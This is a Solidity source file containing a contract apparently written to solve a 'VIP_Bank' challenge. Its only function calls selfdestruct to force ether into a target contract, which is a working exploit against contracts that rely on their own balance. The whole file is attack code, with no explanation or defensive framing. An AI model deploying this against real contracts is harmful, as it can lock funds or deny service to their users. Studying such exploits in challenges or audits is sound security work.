// SPDX-License-Identifier: MIT

pragma solidity 0.8.7;

contract VIP_BankAttack {
  function attack(address payable _target) external payable {
    selfdestruct(_target);
  }
}
